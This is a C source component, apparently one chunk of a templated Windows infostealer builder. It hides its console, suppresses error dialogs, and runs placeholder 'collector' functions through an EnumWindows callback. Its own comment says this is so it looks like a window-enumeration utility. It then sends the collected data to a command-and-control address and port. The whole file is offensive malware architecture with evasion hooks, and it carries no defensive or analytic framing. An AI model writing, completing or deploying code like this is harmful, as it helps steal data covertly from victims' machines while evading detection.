// chunk: arch/callback_enumwin
// depends: core/emit_buffer, exfil/*
// provides: main
// headers: windows.h
// note: Executes collectors via EnumWindows callback — looks like window enumeration utility

#ifndef CHUNK_ARCH_CALLBACK_ENUMWIN
#define CHUNK_ARCH_CALLBACK_ENUMWIN

typedef void (*collector_fn)(void);

static collector_fn g_enumwin_collectors[32];
static int g_enumwin_idx = 0;
static int g_enumwin_count = 0;

static BOOL CALLBACK enum_windows_cb(HWND hwnd, LPARAM lParam) {
    (void)hwnd; (void)lParam;
    if (g_enumwin_idx < g_enumwin_count) {
        g_enumwin_collectors[g_enumwin_idx]();
        g_enumwin_idx++;
        return TRUE;
    }
    return FALSE;
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    FreeConsole();
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return 1;

    collector_fn collectors[] = {
{{COLLECTOR_FN_LIST}}
    };
    g_enumwin_count = sizeof(collectors) / sizeof(collectors[0]);
    for (int i = 0; i < g_enumwin_count && i < 32; i++)
        g_enumwin_collectors[i] = collectors[i];

    EnumWindows(enum_windows_cb, 0);

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
